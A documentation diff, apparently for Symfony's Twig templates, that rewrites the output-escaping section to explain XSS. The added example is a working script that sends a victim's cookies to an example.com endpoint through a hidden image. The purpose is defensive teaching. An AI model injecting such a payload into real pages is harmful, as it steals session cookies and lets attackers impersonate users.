@@ -1278,17 +1278,25 @@ and leaves the repeated contents and HTML structure to some parent templates.
 Read the `Twig template inheritance`_ docs to learn more about how to reuse
 parent block contents when overriding templates and other advanced features.
 
-Output Escaping
----------------
+.. _output-escaping:
+.. _xss-attacks:
+
+Output Escaping and XSS Attacks
+-------------------------------
 
 Imagine that your template includes the ``Hello {{ name }}`` code to display the
-user name. If a malicious user sets ``<script>alert('hello!')</script>`` as
-their name and you output that value unchanged, the application will display a
-JavaScript popup window.
+user name and a malicious user sets the following as their name:
 
-This is known as a `Cross-Site Scripting`_ (XSS) attack. And while the previous
-example seems harmless, the attacker could write more advanced JavaScript code
-to perform malicious actions.
+.. code-block:: html
+
+    My Name
+    <script type="text/javascript">
+        document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
+    </script>
+
+You'll see ``My Name`` on screen but the attacker just secretly stole your cookies
+so they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_
+or XSS attack.
 
 To prevent this attack, use *"output escaping"* to transform the characters
 which have special meaning (e.g. replace ``<`` by the ``&lt;`` HTML entity).
